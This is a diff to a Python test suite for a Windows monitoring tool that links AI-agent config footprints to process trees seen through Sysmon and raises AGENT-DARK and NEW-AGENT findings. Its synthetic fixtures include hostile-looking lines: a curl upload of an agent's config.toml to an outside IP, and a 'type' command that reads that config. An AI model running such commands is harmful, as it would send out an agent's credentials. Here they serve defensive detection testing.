@@ -201,19 +201,118 @@ def candidates_by_sample(texts, inv, catalog, kw):
 
 
 REAL_RUN = discover.run
+FOOTPRINTS = []   # AD-1: every channel round of this file, checked (its footprints == the round without the channel)
+WATCHES = []      # AD-1: every channel watch of this file, checked against the same samples watched without it
+
+
+def tree_of(inv, tid):
+    """The tree of an inventory with this id (C1, A1): (its root's pid, the pids it holds), or None."""
+    for t in (inv.get("candidates") or []) + (inv.get("act_roots") or []):
+        if t["id"] == tid:
+            return t["pid"], {t["pid"]} | set(t.get("tree") or ()) | {a["pid"] for a in t.get("acts") or ()}
+    return None
+
+
+def same_link(link, inv, link0, inv0):
+    """AD-1: a link of a channel round names the tree of that round that holds the root of the tree that links the
+    footprint without the channel (that root's own tree, or the larger tree it is part of); other words are equal."""
+    held0 = tree_of(inv0, link0) if isinstance(link0, str) else None
+    if held0 is None:
+        return link == link0
+    held = tree_of(inv, link) if isinstance(link, str) else None
+    return held is not None and held0[0] in held[1]
+
+
+def footprints_without_channel(texts, inv, catalog, kw):
+    """AD-1: a channel round's footprints and AGENT-DARK are those of the same round built without the channel's
+    records, no more and no fewer; each link names the tree of the round that holds the linking tree's root."""
+    bare = REAL_RUN({k: v for k, v in texts.items() if not k.startswith("sysmon")}, catalog,
+                    **dict(kw, channel=False))
+    assert inv["agent_dark"] == bare["agent_dark"], (inv["agent_dark"], bare["agent_dark"])
+    assert len(inv["footprints"]) == len(bare["footprints"])
+    for f, f0 in zip(inv["footprints"], bare["footprints"]):
+        assert "links" not in f and {k: v for k, v in f.items() if k not in ("candidate", "act_root")} == {
+            k: v for k, v in f0.items() if k not in ("candidate", "act_root")}, (f, f0)
+        for field in ("candidate", "act_root"):
+            assert bool(f[field]) == bool(f0[field]) and same_link(f[field], inv, f0[field], bare), (f, f0)
+    FOOTPRINTS.append(len(inv["footprints"]))
 
 
 def checked_run(texts, catalog, **kw):
     inv = REAL_RUN(texts, catalog, **kw)
     if kw.get("channel"):
         candidates_by_sample(texts, inv, catalog, kw)
+        footprints_without_channel(texts, inv, catalog, kw)
     return inv
+
+
+def judged_footprints(rounds, made):
+    """AD-1: each round's HostFootprint lines as the watch judged them (state, link, live fields, streak, cites);
+    `sample` is the round's read (its window holds the channel's times), said on every line of the round, not a
+    judgement of the footprint."""
+    out = []
+    for r, m in zip(rounds, made):
+        out.append([({k: v for k, v in x["input_meta"].items() if k not in ("linked", "sample")},
+                     x["input_meta"]["linked"], m and m[2])
+                    for x in r["lines"] if x["tool"] == host.FOOTPRINT_TOOL])
+    return out
+
+
+def dark_judged(w):
+    return ([(f["rule_id"], f["round"], f.get("path"), f.get("streak")) for f in w.findings
+             if str(f["rule_id"]).startswith("AGENT-DARK")], [(d["round"], d["path"]) for d in w.dark_notes])
+
+
+def watched_without_channel(tmp_path, w, rounds, made, wall0):
+    """AD-1, the property, checked on every channel watch: the same samples watched WITHOUT the channel (each round's
+    discover run as the channel watch made it, its `sysmon` source left out; a round whose reader failed fails
+    again) give the same HostFootprint lines round by round and the same AGENT-DARK and AGENT-DARK-LIVE knocks and
+    notes."""
+    calls = list(made)
+
+    def read():
+        m = calls.pop(0)
+        if m is None:
+            raise OSError("the reader failed (the channel watch's round, read again without the channel)")
+        return REAL_RUN(m[0], CATALOG, **m[1])
+    clock = host.FixtureClock()
+    w0 = host.HostWatch(read, CATALOG, RULES, notify.Notifier(host.HOST, enabled=False, reason="fixture", host=True),
+                        every=EVERY, err=io.StringIO(), clock=clock, wall=lambda: wall0 + clock.t,
+                        home=str(tmp_path), platform="win32", run="fixture-run", source_every=3600,
+                        sysmon=lambda: (False, "fixture: without the channel"),
+                        os_follow=channel_follow(FakeWevtutil([])))
+    seen = []
+    for _ in made:
+        w0.tick(wait=30)
+        for src in list(w0.sources.values()):
+            if src.thread is not None:
+                src.first_pass.wait(5)
+        w0.tick()
+        seen.append(w0.round_lines[-1])
+        clock.t += EVERY
+    w0.finish()
+    made0 = [None if m is None else (None, None, REAL_RUN(m[0], CATALOG, **m[1])) for m in made]
+    got, want = judged_footprints(rounds, made), judged_footprints(seen, made0)
+    assert [[x[0] for x in r] for r in got] == [[x[0] for x in r] for r in want], (got, want)
+    for r, r0 in zip(got, want):
+        for (_, link, inv), (_, link0, inv0) in zip(r, r0):
+            assert same_link(link, inv, link0, inv0), (link, link0)
+    assert dark_judged(w) == dark_judged(w0), (dark_judged(w), dark_judged(w0))
+    WATCHES.append(len(made))
+    w.without_channel = w0
 
 
 def channel_watch(tmp_path, monkeypatch, samples, rounds, fail=(), sysmon=True, wall0=WALL0, follow=None,
                   reader=None, wevtutil=None, own=None, out=None):
     seen = []
-    monkeypatch.setattr(discover, "run", checked_run)   # AB-6: the property, over every channel round
+    made = []   # AD-1: per reader call, its discover run without the channel's records (and the inventory), or None
+
+    def recording_run(texts, catalog, **kw):
+        inv = checked_run(texts, catalog, **kw)
+        if made and made[-1] is None:
+            made[-1] = ({k: v for k, v in texts.items() if not k.startswith("sysmon")}, dict(kw, channel=False), inv)
+        return inv
+    monkeypatch.setattr(discover, "run", recording_run)   # AB-6, AD-1: the properties, over every channel round
     clock = host.FixtureClock()
     import datetime
     fake = wevtutil or FakeWevtutil(rounds, fail, now=lambda: datetime.datetime.fromtimestamp(
@@ -226,7 +325,12 @@ def channel_watch(tmp_path, monkeypatch, samples, rounds, fail=(), sysmon=True, 
     monkeypatch.setattr(sys, "platform", "win32")   # the window's reader takes the platform from sys (faked here)
     notifier = notify.Notifier(host.HOST, enabled=False, reason="fixture", host=True)
     own = sysmon if own is None else own   # the watch's own check (AB-3); `sysmon` is the live reader's
-    w = host.HostWatch((reader or window_reader)(CATALOG), CATALOG, RULES, notifier, every=EVERY, out=out,
+    base = (reader or window_reader)(CATALOG)
+
+    def read():
+        made.append(None)
+        return base()
+    w = host.HostWatch(read, CATALOG, RULES, notifier, every=EVERY, out=out,
                        err=io.StringIO(), clock=clock, wall=lambda: wall0 + clock.t, home=str(tmp_path),
                        platform="win32", run="fixture-run", source_every=3600,
                        sysmon=lambda: (own, "fixture: the watch's own check"), os_follow=follow or channel_follow(fake))
@@ -239,6 +343,9 @@ def channel_watch(tmp_path, monkeypatch, samples, rounds, fail=(), sysmon=True, 
         seen.append(w.round_lines[-1])
         clock.t += EVERY
     w.finish()
+    if any(m is not None and m[2].get("channel") and not m[2]["channel"].get("off") and not m[2]["channel"].get(
+            "error") for m in made):
+        watched_without_channel(tmp_path / "without-channel", w, seen, made, wall0)
     return w, fake, seen
 
 
@@ -981,18 +1088,24 @@ def dark_rounds(w):
     return [f["round"] for f in w.findings if f["rule_id"] == "AGENT-DARK-LIVE"]
 
 
+DARK_WORDS = "no candidate or act-root of the round built without the channel's records links to it"   # AD-1
+
+
+def footprint_lines(rounds):
+    return [[x["input_meta"] for x in r["lines"] if x["tool"] == host.FOOTPRINT_TOOL] for r in rounds]
+
+
 def test_ab4_a_tree_listed_by_the_channel_does_not_make_a_footprint_live(tmp_path, monkeypatch):
+    # rewritten to AD-1 (it supersedes AB-4): the footprint is judged on the round built without the channel, so the
+    # tree listed by the channel neither makes it live nor is shown as its link
     fp = footprint_dir(tmp_path, "fp")
     reads = agentx_events().replace("cmd /c dir", "cmd /c type C:\\Users\\user\\.kimi\\config.toml")
     w, _, rounds = channel_watch(tmp_path / "a", monkeypatch, [fp] * 4, ["", reads, "", ""])
     w0, _, _ = channel_watch(tmp_path / "b", monkeypatch, [fp] * 4, ["", "", "", ""])   # as before M7.9: unseen
-    (line,) = [x for x in rounds[1]["lines"] if x["tool"] == host.FOOTPRINT_TOOL]
-    assert w.by_channel_count() == 1 and host.BY_CHANNEL in str(line["input_meta"]["linked"])   # the link is shown
-    assert not line["input_meta"]["was_live"] and w.footprints["C:\\Users\\user\\.kimi"].get("live_key") is None
-    assert dark_rounds(w) == dark_rounds(w0) == [3]   # FOR: AGENT-DARK-LIVE at the round it did before M7.9
-    # must not touch: a footprint linked by a knocked (named) tree is live as before
-    w2, _, _ = channel_watch(tmp_path / "c", monkeypatch, [fp] * 5, ["", kimi_events(), "", "", ""])
-    assert w2.footprints["C:\\Users\\user\\.kimi"].get("live_key") is not None and dark_rounds(w2) == []
+    (line,) = footprint_lines(rounds)[1]
+    assert w.by_channel_count() == 1 and line["state"] == "dark" and line["linked"] is None
+    assert not line["was_live"] and w.footprints["C:\\Users\\user\\.kimi"].get("live_key") is None
+    assert dark_rounds(w) == dark_rounds(w0) == dark_rounds(w.without_channel) == [3]   # at the round it did before
 
 
 def test_ab5_the_rule_says_it_a_by_the_channel_line_does_not_fire_a_line_without_the_key_does():
@@ -1224,6 +1337,8 @@ def footprint_states(rounds):
 @pytest.mark.parametrize("pid", [5000, 9216])   # the by-the-channel tree's pid below the shell's, then above it
 def test_ac1_a_footprint_a_knocked_tree_links_is_linked_and_live_whichever_pid_the_channel_tree_has(
         tmp_path, monkeypatch, pid):
+    # rewritten to AD-1: discover's link is the shell's (the round built without the channel has no other linker);
+    # the inventory's `links` is gone
     fp = footprint_dir(tmp_path, "fp")
     k = kimi_child_sample(tmp_path, "k")
     w, _, rounds = channel_watch(tmp_path / "a", monkeypatch, [fp, fp, k], ["", "", reads_footprint(pid)])
@@ -1231,30 +1346,31 @@ def test_ac1_a_footprint_a_knocked_tree_links_is_linked_and_live_whichever_pid_t
     (u,) = [t for kk, t in w.trees.items() if kk[0] == pid]
     (shell,) = [t for kk, t in w.trees.items() if kk[0] == 5888]
     (f,) = w.last_inventory["footprints"]
-    # discover's one link is the first in pid order: the channel tree where its pid is lower (A1's case)
-    assert f["candidate"] == (u["id"] if pid < 5888 else shell["id"]) and len(f["links"]) == 2
+    assert f["candidate"] == shell["id"] and "links" not in f   # whichever pid the channel tree has
     assert u.get("by_channel") and w.by_channel_count() == 1 and shell["knocked"] is not None   # listed; knocked
-    (line,) = [x for x in rounds[2]["lines"] if x["tool"] == host.FOOTPRINT_TOOL]
-    assert line["input_meta"]["linked"] == shell["id"] and line["input_meta"]["was_live"] is True
+    (line,) = footprint_lines(rounds)[2]
+    assert line["linked"] == shell["id"] and line["was_live"] is True
     assert w.footprints["C:\\Users\\user\\.kimi"]["live_key"][0] == 5888
-    # FOR, as the property: the footprint's state in every round is its state with the channel tree taken away
     assert footprint_states(rounds) == footprint_states(rounds0) and dark_rounds(w) == dark_rounds(w0) == []
 
 
 def test_ac1_must_not_touch_the_channel_tree_alone_and_a_named_channel_tree(tmp_path, monkeypatch):
+    # rewritten to AD-1: the channel tree alone leaves the footprint dark and is not shown as its link; a named
+    # brief tree (AC-1 had it link and make it live) now links nothing either: NEW-AGENT still comes (AD-1's MUST
+    # NOT TOUCH), the footprint is dark and AGENT-DARK-LIVE comes at round 3, as before M7.9
     fp = footprint_dir(tmp_path, "fp")
     w, _, rounds = channel_watch(tmp_path / "a", monkeypatch, [fp] * 4, ["", reads_footprint(9216, rec=700)
                                                                           .replace("07:52:", "07:51:"), "", ""])
     w0, _, rounds0 = channel_watch(tmp_path / "b", monkeypatch, [fp] * 4, ["", "", "", ""])
-    (line,) = [x for x in rounds[1]["lines"] if x["tool"] == host.FOOTPRINT_TOOL]
-    assert host.BY_CHANNEL in str(line["input_meta"]["linked"]) and line["input_meta"]["state"] == "dark"   # shown
-    assert footprint_states(rounds) == footprint_states(rounds0) and dark_rounds(w) == dark_rounds(w0) == [3]   # AB-4
+    (line,) = footprint_lines(rounds)[1]
+    assert line["linked"] is None and line["state"] == "dark"
+    assert footprint_states(rounds) == footprint_states(rounds0) and dark_rounds(w) == dark_rounds(w0) == [3]
     w2, _, rounds2 = channel_watch(tmp_path / "c", monkeypatch, [fp] * 5, ["", kimi_events(), "", "", ""])
-    (line2,) = [x for x in rounds2[1]["lines"] if x["tool"] == host.FOOTPRINT_TOOL]
-    assert line2["input_meta"]["state"] == "linked" and line2["input_meta"]["was_live"] is True   # named: it links
-    assert dark_rounds(w2) == []
+    assert [(f["rule_id"], f["round"]) for f in new_findings(w2)] == [(host.NEW_AGENT, 2)]   # the tree knocks
+    assert [x["state"] for r in footprint_lines(rounds2) for x in r] == ["dark"] * 5   # and links nothing
+    assert w2.footprints["C:\\Users\\user\\.kimi"].get("link_key") is None and dark_rounds(w2) == [3]
     threat = " ".join((ROOT / "docs" / "THREAT_MODEL.md").read_text(encoding="utf-8").split())
-    assert "with the unknown trees listed by the channel and not knocked taken away" in threat
+    assert "Reading the channel does not change how a footprint is judged" in threat and "(AC-1):" not in threat
 
 
 def look_reader(seconds):
@@ -1377,7 +1493,13 @@ def test_ac6_state_fields_are_current_and_the_counts_time_is_first_listed(tmp_pa
     w, _, rounds = channel_watch(tmp_path, monkeypatch, ["quiet/quiet", "quiet/quiet", "quiet/talking"],
                                  ["", shell_events(rec=500), ""])
     (key,) = [k for k in w.trees if k[0] == 5888]
-    assert w.trees[key]["candidate_by"] == "sample"   # first by the channel (round 2), then at a sample (round 3)
+    # AD-4 (B8; rewritten): a tree's `candidate_by` in the state (written, never read, wrong for an act-root) is gone;
+    # the line's key stays (AB-5: the rule reads input_meta.by_channel, and the line says candidate_by "channel")
+    assert all("candidate_by" not in t for t in w.trees.values())
+    state = json.loads(Path(w.state_path).read_text(encoding="ascii"))
+    assert "candidate_by" not in json.dumps(state.get("trees"))
+    (line,) = [x for x in rounds[1]["lines"] if x["tool"] == host.TREE_TOOL and x["input_meta"]["pid"] == 5888]
+    assert line["input_meta"]["candidate_by"] == "channel" and line["input_meta"]["by_channel"] is True
     w2, _, _ = channel_watch(tmp_path / "b", monkeypatch, ["quiet/quiet"] * 2, ["", agentx_events()])
     (brief,) = [t for k, t in w2.trees.items() if k[0] == 9216]
     assert "last_sampled_at" in brief and brief["last_sampled_at"] is None   # a tree no sample showed
@@ -1387,15 +1509,216 @@ def test_ac6_state_fields_are_current_and_the_counts_time_is_first_listed(tmp_pa
 
 
 def test_ac2_ac7_the_readme_and_the_help_say_exit_0_and_when_a_footprint_is_dark():
+    # kept true to AD-4's exit-0 words and AD-1's dark words (rewritten)
     readme = " ".join((ROOT / "README.md").read_text(encoding="utf-8").split())
     cli_text = " ".join((ROOT / "raqib" / "cli.py").read_text(encoding="ascii").split())
     for text in (readme, cli_text):
         assert "exit 0 nothing new" not in text and "trees listed and nothing new" not in text
-        assert "no knock and no hole" in text
+        assert "no knock and no hole" not in text   # AD-4: the standing holes the first lines print are holes too
+        assert "nothing knocked, and no round or source that could not be read" in text
+        assert "the standing holes the first lines print do not change the exit" in text
         assert "listed and counted, not knocked" in text
-        assert "an unknown tree listed by the channel and not knocked taken away" in text   # AC-7, the YAML's words
+        assert DARK_WORDS in text and "taken away" not in text   # AD-1, the YAML's words
         assert "a footprint with no tree" not in text
     rule = next(r for r in RULES if r.id == "AGENT-DARK-LIVE")
-    assert "an unknown tree listed by the channel and not knocked taken away" in rule.doc["description"]
+    assert DARK_WORDS in rule.doc["description"] and "taken away" not in rule.doc["description"]
     threat = " ".join((ROOT / "docs" / "THREAT_MODEL.md").read_text(encoding="utf-8").split())
-    assert "inventory.json (discover's own record) still shows the link" in threat
+    assert "still shows the link" not in threat
+    assert "a footprint whose agent ran only between rounds is judged dark as before the rounds read the channel," \
+           " though the tree was seen; joining the two is a later task (M7.12)" in threat
+
+# --- REDO 6 (ADR-0007 Amendment AD) ------------------------------------------------------------------------
+
+KIMI_FP = "C:\\Users\\user\\.kimi"
+
+
+def under_the_shell(pid, at="2026-11-10 08:00:"):
+    """B1 (SYNTHETIC): an unknown program whose parent is the sampled shell (pid 5888) and whose command line names
+    the .kimi footprint; it talks and starts `cmd /c dir`, all between rounds 1 and 2 of a watch started at LATE."""
+    g = guid_of(pid)
+    return "".join([
+        created(720, at + "10.000", pid, AGENTX, g, 5888, PS, G_SHELL,
+                "agentx --config C:\\Users\\user\\.kimi\\config.toml"),
+        talked(721, at + "11.000", pid, AGENTX, g, port=50400, dest="203.0.113.70"),
+        created(722, at + "12.000", pid + 114, "C:\\Windows\\System32\\cmd.exe", guid_of(pid + 114), pid, AGENTX, g,
+                "cmd /c dir")])
+
+
+@pytest.mark.parametrize("pid", [5000, 9216])   # below the shell's pid, then above it
+def test_ad1_b1_a_channel_tree_in_a_history_shells_tree_leaves_the_footprint_dark(tmp_path, monkeypatch, pid):
+    fp = footprint_dir(tmp_path, "fp", base="quiet/talking")
+    w, _, rounds = channel_watch(tmp_path / "a", monkeypatch, [fp] * 3, ["", under_the_shell(pid), ""], wall0=LATE)
+    (shell,) = [t for k, t in w.trees.items() if k[0] == 5888]
+    (u,) = [t for k, t in w.trees.items() if k[0] == pid]
+    assert shell["history"] and u.get("by_channel") and u["first_round"] == 2   # B1's inputs
+    assert [(x["state"], x["linked"]) for r in footprint_lines(rounds) for x in r] == [("dark", None)] * 3
+    assert dark_rounds(w) == dark_rounds(w.without_channel) == [3]   # FOR: AGENT-DARK-LIVE at round 3, as before
+    assert w.footprints[KIMI_FP].get("link_key") is None
+
+
+def act_root_sample(tmp_path, name, children=True):
+    """quiet/quiet with the .kimi footprint and B3's tree (SYNTHETIC): agentx under AppData, its parent the sampled
+    powershell (a listed shell), with a sampled cmd.exe that has kimi.exe below it; it never talks at a sample."""
+    d = footprint_dir(tmp_path, name)
+    with open(d / "win-process-1.csv", "a", encoding="ascii", newline="\n") as f:
+        f.write('"9216","5888","agentx.exe","%s","agentx","2026-11-10T07:49:00.000Z"\n' % AGENTX)
+        if children:
+            f.write('"9330","9216","cmd.exe","C:\\Windows\\System32\\cmd.exe","cmd","2026-11-10T07:49:01.000Z"\n')
+            f.write('"9340","9330","kimi.exe","%s","kimi","2026-11-10T07:49:02.000Z"\n' % KIMI)
+    return d
+
+
+def polls(seconds, rec):
+    """B3: the act-root's own talk (event 3, SYNTHETIC), `seconds` after the fixture watch's start."""
+    return talked(rec, at_text(seconds), 9216, AGENTX, G_AGENTX, port=50600, dest="203.0.113.70")
+
+
+def test_ad1_b3_an_act_root_that_talks_only_in_the_channel_keeps_its_footprint_linked(tmp_path, monkeypatch):
+    a = act_root_sample(tmp_path, "a")
+    w, _, rounds = channel_watch(tmp_path / "w", monkeypatch, [a] * 4,
+                                 [polls(0, 750), polls(60, 751), polls(180, 752), polls(300, 753)])
+    (key,) = [k for k in w.trees if k[0] == 9216]
+    assert w.trees[key]["class"] == "candidate" and w.trees[key].get("by_channel")   # a candidate by the channel
+    lines = footprint_lines(rounds)
+    assert [x["state"] for r in lines for x in r] == ["linked"] * 4   # FOR: linked every round
+    (u0,) = [t for t in w.without_channel.last_inventory["act_roots"] if t["pid"] == 9216]   # without it: act-root
+    assert footprint_lines([w.without_channel.last_round])[0][0]["linked"] == u0["id"]
+    assert lines[-1][0]["linked"] == w.trees[key]["id"] and w.footprints[KIMI_FP]["link_key"] == key   # its tree
+    assert w.footprints[KIMI_FP].get("live_key") is None and not any(x["was_live"] for r in lines for x in r)
+    assert dark_rounds(w) == dark_rounds(w.without_channel) == []   # never knocks
+
+
+def test_ad1_a_tree_of_the_round_only_by_the_channel_is_quiet_for_the_footprint_as_without_it(tmp_path, monkeypatch):
+    # round 1 the sampled act-root links the footprint; in round 2 its children are gone (no tree of that round
+    # without the channel: the footprint is linked to its quiet tree), and the channel shows it talk and start a
+    # child, so the round WITH the channel holds it as a candidate: for the footprint it is still the quiet tree
+    a, alone = act_root_sample(tmp_path, "a"), act_root_sample(tmp_path, "alone", children=False)
+    child = created(761, at_text(62), 9400, "C:\\Windows\\System32\\cmd.exe", guid_of(9400), 9216, AGENTX, G_AGENTX,
+                    "cmd /c ver")
+    w, _, rounds = channel_watch(tmp_path / "w", monkeypatch, [a, alone, alone], ["", polls(60, 760) + child, ""])
+    (key,) = [k for k in w.trees if k[0] == 9216]
+    (tree,) = [x for x in rounds[1]["lines"] if x["tool"] == host.TREE_TOOL and x["input_meta"]["pid"] == 9216]
+    assert tree["input_meta"]["class"] == "candidate" and tree["input_meta"]["by_channel"]   # the inputs
+    lines = footprint_lines(rounds)
+    assert [x["state"] for r in lines for x in r] == ["linked"] * 3
+    assert lines[1][0]["linked"] == "%s tree %s" % (host.QUIET, host.tree_word(key))   # FOR: as without the channel
+    assert dark_rounds(w) == dark_rounds(w.without_channel) == []
+
+
+def benign_naming(at="2026-11-10 07:51:"):
+    """B9 (SYNTHETIC): a brief msedge under Program Files whose command line names a file in .kimi; it talks and
+    starts curl, between rounds 1 and 2."""
+    edge = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
+    return "".join([created(900, at + "00.000", 9900, edge, guid_of(9900), 5100, EXPLORER, guid_of(5100),
+                            "msedge C:\\Users\\user\\.kimi\\notes.html"),
+                    talked(901, at + "01.000", 9900, edge, guid_of(9900), port=50500),
+                    created(902, at + "02.000", 9910, "C:\\Windows\\System32\\curl.exe", guid_of(9910), 9900, edge,
+                            guid_of(9900), "curl -s https://198.51.100.20/z")])
+
+
+def test_ad1_b9_a_benign_brief_tree_naming_the_footprint_makes_nothing_live(tmp_path, monkeypatch):
+    fp = footprint_dir(tmp_path, "fp")
+    w, _, rounds = channel_watch(tmp_path / "w", monkeypatch, [fp] * 4, ["", benign_naming(), "", ""])
+    (key,) = [k for k in w.trees if k[0] == 9900]
+    assert w.trees[key]["benign"] and rounds[1]["benign"] == [host.tree_word(key)]   # the inputs
+    assert [(x["state"], x["linked"], x["was_live"]) for r in footprint_lines(rounds) for x in r] == [
+        ("dark", None, False)] * 4
+    assert w.footprints[KIMI_FP].get("live_key") is None and w.dark_notes == []
+    assert dark_rounds(w) == dark_rounds(w.without_channel) == [3]   # the knock it gave before M7.9
+
+
+def test_ad1_must_not_touch_a_named_brief_tree_still_knocks_and_does_not_link(tmp_path, monkeypatch):
+    fp = footprint_dir(tmp_path, "fp")
+    reads = kimi_events().replace("curl -s https://198.51.100.20/x", "curl -T C:\\Users\\user\\.kimi\\config.toml"
+                                                                     " https://198.51.100.20/x")
+    w, _, rounds = channel_watch(tmp_path / "w", monkeypatch, [fp] * 4, ["", reads, "", ""])
+    (key,) = [k for k in w.trees if k[0] == 9176]
+    assert [(f["rule_id"], f["round"], f["tree"]) for f in new_findings(w)] == [
+        (host.NEW_AGENT, 2, host.tree_word(key))]   # MUST NOT TOUCH: the tree, its knock
+    assert w.sources.get(key) is not None   # and its source
+    assert [x["state"] for r in footprint_lines(rounds) for x in r] == ["dark"] * 4   # FOR: it links nothing
+    assert w.footprints[KIMI_FP].get("link_key") is None and dark_rounds(w) == [3]
+
+
+def test_ad1_the_property_over_the_fixture_sweep(tmp_path):
+    before = len(FOOTPRINTS)
+    samples = [footprint_dir(tmp_path, "q"), footprint_dir(tmp_path, "t", base="quiet/talking"),
+               kimi_child_sample(tmp_path, "k"), act_root_sample(tmp_path, "a"),
+               act_root_sample(tmp_path, "alone", children=False)]
+    reads = [reads_footprint(5000), reads_footprint(9216), under_the_shell(5000), under_the_shell(9216),
+             kimi_events(), benign_naming(), agentx_events(), shell_events(), polls(60, 760), "",
+             polls(60, 760) + created(761, at_text(62), 9400, "C:\\Windows\\System32\\cmd.exe", guid_of(9400), 9216,
+                                      AGENTX, G_AGENTX, "cmd /c type C:\\Users\\user\\.kimi\\config.toml")]
+    dark, linked = 0, 0
+    for d in samples:
+        for xml in reads:
+            texts, holes = channel_texts(d, channel_xml(xml))
+            inv = checked_run(texts, CATALOG, holes=holes, processes=True, channel=True)
+            dark += len(inv["agent_dark"])
+            linked += sum(1 for f in inv["footprints"] if f["candidate"] or f["act_root"])
+    assert len(FOOTPRINTS) - before == len(samples) * len(reads) and dark and linked
+
+
+def test_ad1_must_not_touch_a_round_without_the_channel_keeps_its_shape(tmp_path, monkeypatch):
+    for d in (act_root_sample(tmp_path, "a"), kimi_child_sample(tmp_path, "k")):
+        texts, holes = discover.read_dir(str(d))
+        inv = REAL_RUN({k: v for k, v in texts.items() if not k.startswith("sysmon")}, CATALOG, holes=holes,
+                       processes=True)
+        assert inv["footprints"] and all(set(f) <= {"path", "match", "agent", "candidate", "act_root", "cites",
+                                                    "unjudged"} for f in inv["footprints"])
+        assert not any(k in t for t in inv["candidates"] + inv["act_roots"] for k in ("bare_class", "candidate_by"))
+    w, _, _ = channel_watch(tmp_path / "w", monkeypatch, [act_root_sample(tmp_path, "b")] * 2, ["", ""], sysmon=False)
+    assert not hasattr(w, "without_channel") and w.footprints[KIMI_FP]["state"] == "linked"
+
+
+def talking_unread(tmp_path, name, image=None):
+    """quiet/talking with the shell's CreationDate unread (test_ab7's "talking-unread"); with `image`, that program
+    in the shell's place (SYNTHETIC)."""
+    import shutil
+    d = tmp_path / name
+    shutil.copytree(str(HOSTFIX / "quiet" / "talking"), str(d))
+    rows = (d / "win-process-1.csv").read_text(encoding="ascii").replace(
+        '.exe"","2026-11-10T07:50:00.000Z"', '.exe"",""', 1)
+    if image:
+        rows = rows.replace(PS, image).replace('"powershell.exe"', '"%s"' % image.rsplit("\\", 1)[1])
+    (d / "win-process-1.csv").write_text(rows, encoding="ascii")
+    return d
+
+
+def test_ad2_b2_a_guid_tree_beside_a_sampled_tree_whose_start_was_unread_takes_its_history(tmp_path, monkeypatch):
+    after = shell_events(rec=500, create=False, at="2026-11-10 08:00:00")
+    w, _, rounds = look_watch(tmp_path / "unknown", monkeypatch, [talking_unread(tmp_path, "t")] * 2, [after, ""])
+    keys = [k for k in w.trees if k[0] == 5888]
+    assert len(keys) == 2 and any(w.trees[k]["brief"] and w.trees[k]["guid"] == G_SHELL for k in keys)   # the split
+    assert all(w.trees[k]["history"] and not w.trees[k].get("by_channel") for k in keys)   # FOR: history, untagged
+    assert rounds[0]["by_channel"] == [] and w.by_channel_count() == 0 and new_findings(w) == []   # not counted
+    assert "seen a candidate only by the channel" not in w.summary()[0]
+    named = talking_unread(tmp_path, "n", image=KIMI)
+    w2, _, rounds2 = look_watch(tmp_path / "named", monkeypatch, [named] * 2, [after.replace(PS, KIMI), ""])
+    keys2 = [k for k in w2.trees if k[0] == 5888]
+    assert len(keys2) == 2 and all(w2.trees[k]["named"] and w2.trees[k]["history"] for k in keys2)
+    assert new_findings(w2) == [] and rounds2[0]["new"] == []   # no NEW-AGENT in round 1
+
+
+def test_ad2_must_not_touch_ac3s_case_with_the_start_unread(tmp_path, monkeypatch):
+    # no candidate of that pid and image at round 1's sample (the shell is quiet there, its start unread): the guid's
+    # tree is AC-3's, not history: listed by the channel, tagged and counted (test_ac3_* hold the start-read side)
+    after = shell_events(rec=500, create=False, at="2026-11-10 08:00:00")
+    w, _, rounds = look_watch(tmp_path, monkeypatch, ["quiet/quiet-unread"], [after])
+    (key,) = [k for k in w.trees if k[0] == 5888]
+    assert w.trees[key]["brief"] and not w.trees[key]["history"] and rounds[0]["by_channel"] == [host.tree_word(key)]
+    assert w.by_channel_count() == 1
+
+
+def test_ad4_the_readers_first_check_and_exit_0_beside_a_standing_hole(tmp_path, monkeypatch):
+    lines, _ = first_lines(tmp_path / "f", "win32", True)
+    text = "\n".join(lines)
+    assert "the live reader's first check" in text and "own check at round 1" not in text   # AD-4 (B6)
+    for path in (ROOT / "raqib" / "host.py", ROOT / "docs" / "THREAT_MODEL.md", ROOT / "README.md"):
+        body = " ".join(path.read_text(encoding="utf-8").split())
+        assert "check at round 1 differs" not in body and "own check at round 1 finds Sysmon" not in body, path
+    # AD-4 (B7): the standing hole the first lines print does not change the exit
+    lines, _ = first_lines(tmp_path / "g", "win32", False)
+    assert any(x.startswith("raqib watch --host: hole: ") and BETWEEN in x for x in lines)
+    w, _, _ = channel_watch(tmp_path / "w", monkeypatch, ["quiet/quiet"] * 2, ["", ""], sysmon=False, own=False)
+    assert BETWEEN in " ".join(w.notes) and w.holes == [] and w.result()[0] in ("clean", "none-seen"), w.result()
